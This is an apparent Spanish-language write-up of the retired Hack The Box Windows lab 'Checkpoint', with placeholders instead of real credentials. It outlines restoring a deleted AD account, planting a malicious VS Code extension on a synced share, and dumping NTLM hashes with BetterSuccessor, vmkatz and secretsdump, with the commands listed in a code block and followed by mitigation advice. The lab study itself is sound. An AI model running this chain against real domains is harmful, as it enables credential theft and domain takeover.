---
machine: Checkpoint
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, active-directory, recycle-bin, vscode, vmkatz]
---

# Checkpoint — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El escenario parte de credenciales de assume-breach. La Papelera de Reciclaje de AD permite restaurar un usuario borrado; su escritura en un share sirve para plantar una extensión de VS Code que instala un trabajo de sincronización. BetterSuccessor y `vmkatz` sobre un backup de VMware llevan al hash del administrador.

## Reconocimiento

```bash
nmap -Pn -sCV -p88,389,445,5985,3389 <IP>
nxc smb <DC> -u <USER> -p '<PASS>'
# AD Recycle Bin
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties *
Restore-ADObject -Identity <GUID>
# Share y extensión
smbclient //<HOST>/<SHARE> -U <USER>%<PASS> -c "put extension.vsix"
code --install-extension extension.vsix
# Hashes
BetterSuccessor.exe -target <USER>
vmkatz.exe -f memory.vmem
secretsdump.py -hashes :<HASH> <DOMAIN>/Administrator@<DC>
```

## Enumeración

- Credenciales iniciales válidas y AD Recycle Bin habilitado.
- Share escribible consumido por un trabajo de sincronización.
- Backup de memoria de VMware y cuenta con derechos para leerlo.

## Acceso inicial

Con las credenciales iniciales se enumeran objetos eliminados y se restaura una cuenta. Esa cuenta puede escribir en un share; se publica un `.vsix` con una extensión maliciosa que el trabajo de sincronización instala y ejecuta.

## Escalada de privilegios

BetterSuccessor obtiene el hash NTLM de una cuenta objetivo. `vmkatz` analiza el backup de memoria de VMware y recupera el hash del administrador local, reutilizado por el Administrator del dominio; con él se accede al DC.

## Evidencia

- Usuario restaurado desde AD Recycle Bin.
- Extensión instalada por el trabajo y shell.
- Hash recuperado con vmkatz y acceso de dominio.

## Lecciones aprendidas

- La Papelera de Reciclaje conserva cuentas y permisos antiguos.
- Los trabajos de sincronización instalan código desde shares.
- Los backups de memoria son credenciales en claro.

## Mitigación y detección

- Auditar objetos eliminados y sus permisos.
- Restringir shares de sincronización y firmar extensiones.
- Cifrar backups y limitar quién puede leer la memoria.

## Referencias

- [0xdf — Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
- [Microsoft — AD Recycle Bin](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin)
- [Hack The Box — Checkpoint](https://app.hackthebox.com/machines/checkpoint)
